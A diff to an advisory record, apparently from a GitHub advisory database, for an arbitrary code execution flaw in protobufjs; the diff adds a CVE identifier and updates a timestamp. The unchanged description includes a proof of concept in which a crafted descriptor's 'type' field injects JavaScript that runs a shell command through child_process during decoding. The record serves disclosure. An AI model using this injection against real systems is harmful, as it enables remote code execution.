@@ -21,6 +21,10 @@
       {
         "Type": "GHSA",
         "Value": "GHSA-xq3m-2v4x-88gg"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-41242"
       }
     ],
     "Description": "### Summary\nprotobufjs compiles protobuf definitions into JS functions. Attackers can manipulate these definitions to execute arbitrary JS code.\n\n### Details\nAttackers can inject arbitrary code in the \"type\" fields of protobuf definitions, which will then execute during object decoding using that definition.\n\n### PoC\n```js\nconst protobuf = require('protobufjs');\nmaliciousDescriptor = JSON.parse(`{\"nested\":{\"User\":{\"fields\":{\"id\":{\"type\":\"int32\",\"id\":1},\"data\":{\"type\":\"Data(){console.log(process.mainModule.require('child_process').execSync('id').toString())};\\\\nfunction X\",\"id\":2}}},\"Data(){console.log(process.mainModule.require('child_process').execSync('id').toString())};\\\\nfunction X\":{\"fields\":{\"content\":{\"type\":\"string\",\"id\":1}}}}}`)\nconst root = protobuf.Root.fromJSON(maliciousDescriptor);\nconst UserType = root.lookupType(\"User\");\nconst userBytes = Buffer.from([0x08, 0x01, 0x12, 0x07, 0x0a, 0x05, 0x68, 0x65, 0x6c, 0x6c, 0x6f]);\ntry {\n    const user = UserType.decode(userBytes);\n} catch (e) {}\n```\n\n### Impact\nRemote code execution when attackers can control the protobuf definition files.",
@@ -28,7 +32,7 @@
     "PublishedAt": "2026-04-16T22:34:57Z",
     "Severity": "CRITICAL",
     "Summary": "Arbitrary code execution in protobufjs",
-    "UpdatedAt": "2026-04-16T22:34:57Z",
+    "UpdatedAt": "2026-04-18T16:18:24Z",
     "WithdrawnAt": "",
     "CVSS": {
       "Score": 0,
